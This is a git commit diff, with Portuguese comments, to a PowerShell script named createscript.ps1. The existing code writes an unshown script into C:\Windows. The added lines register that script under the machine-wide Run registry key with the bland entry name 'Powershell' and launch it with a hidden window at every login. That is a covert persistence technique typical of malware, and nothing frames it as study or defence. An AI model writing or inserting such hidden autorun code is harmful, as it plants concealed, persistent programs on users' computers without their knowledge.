c842563d5e78693795cb37b1b8538f43498a319a
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-18 01:24:40 -0300

    Update createscript.ps1

--- createscript.ps1
+++ createscript.ps1
@@ -8,3 +8,10 @@ $filePath = "C:\Windows\powershell1.ps1"
 
 # Salva o conteúdo no arquivo especificado
 Set-Content -Path $filePath -Value $scriptContent -Force
+
+# Caminho do script PowerShell
+$programPath = "C:\Windows\powershell1.ps1"
+
+# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
+$command = "powershell.exe -WindowStyle Hidden -File `"$programPath`""
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
